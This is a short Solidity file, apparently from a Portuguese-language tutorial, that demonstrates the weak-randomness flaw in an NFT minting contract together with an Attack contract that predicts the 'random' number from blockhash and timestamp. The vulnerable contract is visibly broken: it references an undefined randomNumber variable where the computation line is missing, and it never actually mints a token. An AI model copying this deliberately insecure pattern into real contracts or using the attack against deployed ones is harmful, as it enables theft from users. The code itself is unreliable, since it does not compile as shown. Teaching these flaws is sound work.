// SPDX-License-Identifier: MIT
// Por 0xAA
pragma solidity ^0.8.4;
import "../34_ERC721/ERC721.sol";

contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // Construtor, inicializa o nome e o código da coleção NFT
    constructor() ERC721("", ""){}

    // Função de construção: só é possível fazer a cunhagem quando o número da sorte inserido for igual ao número aleatório.
    function luckyMint(uint256 luckyNumber) external {
        // obter número aleatório ruim
        require(randomNumber == luckyNumber, "Better luck next time!");

        // mint
        totalSupply++;
    }
}

contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // Calcular números aleatórios antecipadamente
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // Usando o luckyNumber para atacar
        nftAddr.luckyMint(luckyNumber);
    }
}
